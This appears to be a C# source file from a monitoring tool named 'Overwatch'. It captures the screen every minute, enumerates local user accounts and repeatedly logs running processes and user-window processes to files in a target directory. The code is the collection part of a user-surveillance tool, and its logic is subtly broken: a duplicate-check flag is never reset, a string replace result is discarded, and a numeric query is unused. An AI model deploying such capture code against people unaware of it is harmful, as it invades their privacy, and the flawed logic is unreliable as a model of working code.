using System;
using System.Linq;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.DirectoryServices;

namespace Overwatch
{
    class cReceiveInformation
    {
        public Graphics graph = null;
        public Bitmap bmp= new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        static appLog Log = new appLog();
        public static void CreateAndUpdateDate(string text, string WayAndName) { System.IO.File.AppendAllText(WayAndName, text); }
        public static List<string> GetComputerUsers()
        {
            List<string> users = new List<string>();
            try
            {
                var path = string.Format("WinNT://{0},computer", Environment.MachineName);
                using (var computerEntry = new DirectoryEntry(path))
                    foreach (DirectoryEntry childEntry in computerEntry.Children)
                        if (childEntry.SchemaClassName == "User")
                            users.Add(childEntry.Name);
                return users;
            }
            catch (Exception ex) { Log.Write(ex.Message, true); return users; }
        }

        public void ScreenShoot()
        {
            try
            {
                while (true)
                {
                    graph = Graphics.FromImage(bmp);
                    graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    bmp.Save(appConfing.targetDirPath + "\\Image.bmp");
                    System.Threading.Thread.Sleep(60000);
                }
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
        
        private static List<string> GeneralProcess()
        {
            Process[] procList = Process.GetProcesses();
            List<int> numbers2 = new List<int>() { 15, 14, 11, 13, 19, 18, 16, 17, 12, 10 };
            IEnumerable<int> largeNumbersQuery = numbers2.Where(c => c > 15);
            List<string> processUse = new List<string>();
            string ProcessName = "";
            bool Equal = false;
            foreach (Process a in procList)
            {
                for (int i = 0; i < processUse.Count; i++)
                    if (a.ProcessName == processUse[i])
                        Equal = true;
                if (Equal == false && a.ProcessName != "svchost")
                    processUse.Add(a.ProcessName);
            }
            foreach (string a in processUse) { ProcessName += a.ToString() + " "; }
            CreateAndUpdateDate(ProcessName, appConfing.targetDirPath + "\\GeneralApplication.txt");
            return processUse;
        }
        private static void LocalProcess()
        {
            try
            {
                var Users = GetComputerUsers();
                string UsersName = "";
                foreach (var a in Users) { UsersName += a.ToString() + "|"; UsersName.Replace(" ", ","); }
                UsersName += "Administrator";
                string name = System.Environment.GetEnvironmentVariable("COMPUTERNAME");
                Process.GetProcesses().Where(p => new Regex(UsersName).IsMatch(p.MainWindowTitle)).ToList().ForEach(p => CreateAndUpdateDate(p.ProcessName + " ", appConfing.targetDirPath + "\\UsersApplication.txt"));
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
    
        public void Overview() {
            while (true)
            {
                GeneralProcess();
                LocalProcess();
                System.Threading.Thread.Sleep(600000);
            }
        }
    }
}
